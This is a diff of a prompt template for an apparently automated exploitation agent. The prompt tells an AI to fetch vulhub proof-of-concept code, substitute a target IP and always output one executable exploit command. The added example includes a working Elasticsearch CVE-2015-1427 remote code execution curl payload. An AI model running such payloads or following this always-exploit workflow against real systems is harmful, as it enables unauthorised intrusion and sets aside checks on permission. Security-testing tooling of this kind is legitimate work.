@@ -92,15 +92,29 @@ TASK:
 1. Check the Links in vulnerability info for GitHub/vulhub URLs
 2. Use ReadHTML to fetch the PoC from the link (it auto-extracts code blocks from README)
 3. Analyze the PoC code and adapt it for the target IP
-4. Output ONE specific, executable exploit command
+4. Output ONE specific, executable exploit command as your Final Answer
 
 IMPORTANT:
 - ReadHTML supports GitHub vulhub links (e.g., https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427)
 - It will return the curl/exploit commands from the README
-- Replace the example IP/URL in PoC with the actual target from vuln_url
+- Replace the example IP/URL in PoC with the actual target IP from the vulnerability info
+- You MUST give a Final Answer with a concrete exploit command, even if the PoC needs adaptation
 
-OUTPUT FORMAT:
-Final Answer: [The exact curl/exploit command with target IP substituted]
+EXAMPLE WORKFLOW:
+Thought: I need to fetch the PoC from the vulhub link.
+Action: ReadHTML
+Action Input: https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427
+
+(After reading the PoC)
+Thought: I now know the final answer
+Final Answer: curl -X POST 'http://TARGET_IP:9200/_search?pretty' -H 'Content-Type: application/json' -d '{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}'
+
+CRITICAL RULES:
+- After ReadHTML returns PoC content, you MUST immediately produce a Final Answer with the adapted command
+- Do NOT write long analysis paragraphs. Keep your response SHORT.
+- The Final Answer MUST contain a concrete, executable command (curl/wget/python etc.)
+- If the PoC has multiple steps (e.g., first create data, then exploit), combine them or pick the exploit step
+- Replace 'your-ip', 'target-ip', 'example.com' etc. with the actual target IP from vuln_url
 """ + _REACT_FOOTER
 
 
